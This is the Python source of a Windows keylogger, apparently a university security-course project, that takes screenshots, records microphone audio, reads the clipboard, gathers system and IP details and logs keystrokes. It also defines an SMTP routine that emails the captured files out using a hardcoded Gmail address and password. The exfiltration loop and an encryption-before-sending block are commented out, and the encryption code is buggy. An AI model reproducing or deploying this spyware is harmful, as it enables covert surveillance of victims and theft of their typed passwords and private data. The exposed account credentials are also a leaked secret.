# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

filepath = 'D:\\UNSW\\Term 1 2022\\COMP6841\\Something Awesome Project\\Keylogger'
fileAccessExtension = '\\'

##################################### TIMER  ################################################################

numberOfIterationStart = 0
numberOfIterationEnd = 3
timeForKeyloggerToRun = 15
currentTime = time.time()
stoppingTime = time.time() + timeForKeyloggerToRun

##################################### TIMER  ################################################################

##################################### GETTING SCREENSHOTS  ################################################################
screenshotInfo = 'screenshot.png'

def screenshot():
    image  = ImageGrab.grab()
    image.save(filepath + fileAccessExtension + screenshotInfo)

screenshot()

##################################### GETTING SCREENSHOTS  ################################################################


##################################### GETTING MICROPHONE INFO  ################################################################

microhponeTime = 20
audioFile = 'audio.wav'

def microphone():
    fs = 44100
    recording = sd.rec(int(microhponeTime * fs), samplerate=fs, channels=2)
    sd.wait()

    write(filepath + fileAccessExtension + audioFile, fs, recording)

microphone()


##################################### GETTING MICROPHONE INFO  ################################################################


##################################### GETTING CLIPBOARD INFO  ################################################################

clipboardInfo = 'clipboardInfo.txt'

def copy_clipboard():
    with open(filepath + fileAccessExtension + clipboardInfo, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            clipboardData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write('Clipboard Info: \n' + clipboardData)
        except:
            f.write('Could not get clipboard info')

# copy_clipboard()


##################################### GETTING CLIPBOARD INFO  ################################################################


##################################### GETTING COMPUTER INFO  ################################################################

systemInfo = 'systemInfo.txt'

def getComputerInfo():
    with open(filepath + fileAccessExtension + systemInfo, 'a') as f:
        hostname = socket.gethostname()
        ipAddress = socket.gethostbyname(hostname)
        try:
            publicIP = get('https://api.ipify.org').text
            f.write('Public IP: ' + publicIP)
        except Exception:
            f.write('Cannot access the public IP address from API')

        f.write('Processor info: ' + platform.processor() + '\n')
        f.write('System info: ' + platform.system() + ' ' + platform.version() + '\n')
        f.write('Machine info: ' + platform.machine() + '\n')
        f.write('Hostname info: ' + hostname + '\n')
        f.write('Private IP Address: ' + ipAddress + '\n')

getComputerInfo()

##################################### GETTING COMPUTER INFO  ################################################################


##################################### EMAIL SENDING  ################################################################

emailAddress = 'bbllhhbbllhh@gmail.com'
password = 'bb11hhbb11hh'

toSend = 'bbllhhbbllhh@gmail.com'

def sendEmail(filename, keyLogFile, toSend):
    emailFrom = emailAddress
    msg = MIMEMultipart()
    msg['From'] = emailAddress
    msg['To'] = toSend
    keyLogFile = open((keyLogFile), 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((keyLogFile.read()))
    encoders.encode_base64(p)
    p.add_header('Content Disposition', 'attachment filename= filename')
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(emailAddress, password)
    text = msg.as_string()
    s.sendmail(emailAddress, toSend, text)
    s.quit()

# sendEmail(keyInfo, filepath + fileAccessExtension + keyInfo, toSend)

##################################### EMAIL SENDING  ################################################################


##################################### KEY LOGGING  ################################################################

keyInfo = 'keyInfoLog.txt'

count = 0
keys = []

while  numberOfIterationStart < numberOfIterationEnd:

    def onKeyPressed(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []


    def writeToFile(keys):
        with open(filepath + fileAccessExtension + keyInfo, 'a') as f:
            for key in keys:
                tempKey = str(key).replace("'", "")
                if tempKey.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif tempKey.find('Key') == -1:
                    f.write(tempKey)
                    f.close()


    def onKeyReleased(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=onKeyPressed, on_release=onKeyReleased) as listener:
        listener.join()

    # if currentTime > stoppingTime:
    #     sendEmail(keyInfo, filepath + fileAccessExtension + keyInfo, toSend)
    #
    #     with open(filepath + fileAccessExtension + keyInfo, 'w') as f:
    #         f.write(' ')
    #
    #     screenshot()
    #     sendEmail(screenshotInfo, filepath + fileAccessExtension + screenshotInfo, toSend)
    #
    #     getComputerInfo()
    #     sendEmail(systemInfo, filepath + fileAccessExtension + systemInfo, toSend)
    #
    #     copy_clipboard()
    #     sendEmail(clipboardInfo, filepath + fileAccessExtension + clipboardInfo, toSend)
    #
    #     numberOfIterationStart += 1
    #     currentTime = time.time()
    #     stoppingTime = time.time() + timeForKeyloggerToRun

##################################### KEY LOGGING  ################################################################

##################################### ENCRYPTION  ################################################################

# keyInfoEncrypted = 'sys1.txt'
# sysInfoEncrypted = 'sys2.txt'
# clipboardInfoEncrypted = 'sys3.txt'
# key = 'Blnqc9FN5l-aORHYCkm3bFih2jOOXr1if6b-z3J-Ohg='
#
# filesToEncrypt = [filepath +fileAccessExtension + keyInfo, filepath +fileAccessExtension + systemInfo, filepath +fileAccessExtension + clipboardInfo]
# encryptedFiles = [filepath +fileAccessExtension + keyInfoEncrypted, filepath +fileAccessExtension + sysInfoEncrypted, filepath +fileAccessExtension + clipboardInfoEncrypted]
#
# for encryptedFile in filesToEncrypt:
#     with open(filesToEncrypt[count], 'rb') as f:
#         data = f.read()
#     fernet = Fernet(key)
#     encryptedData = fernet.encrypt(fernet)
#
#     with open(encryptedFiles[count], 'wb') as f:
#         f.write(encryptedData)
#
#     sendEmail(encryptedFiles[count], encryptedFiles[count], toSend)
#
#     count += 1
#
# time.sleep(120)

##################################### ENCRYPTION  ################################################################